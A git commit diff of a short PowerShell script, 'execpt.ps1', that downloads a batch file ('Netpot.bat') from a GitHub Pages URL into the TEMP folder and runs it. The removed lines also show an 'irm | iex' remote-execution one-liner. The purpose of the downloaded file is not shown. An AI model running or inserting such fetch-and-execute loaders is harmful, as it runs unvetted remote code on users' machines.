937850cbfebff78ba5f89eec00b7659d8a931b9b
bokluk0 <144320942+Young-Zerka@users.noreply.github.com>
2025-10-08 16:34:54 +0300

    Update execpt.ps1

--- execpt.ps1
+++ execpt.ps1
@@ -1,7 +1,4 @@
-$batUrl=$args[0]
-$tmp=Join-Path $env:TEMP 'netpot.bat'
-Invoke-WebRequest -Uri $batUrl -OutFile $tmp
-Start-Process -FilePath $tmp -Wait
-Remove-Item -Path $tmp -Force
-
-# irm 'https://raw.githubusercontent.com/username/repo/branch/path/execpt.ps1' | iex 'https://example.com/script.bat'
+$batUrl = 'https://young-zerka.github.io/netpot/Netpot.bat'
+$tempPath = "$env:TEMP\Netpot.bat"
+Invoke-WebRequest -Uri $batUrl -OutFile $tempPath
+Start-Process -FilePath $tempPath -Wait
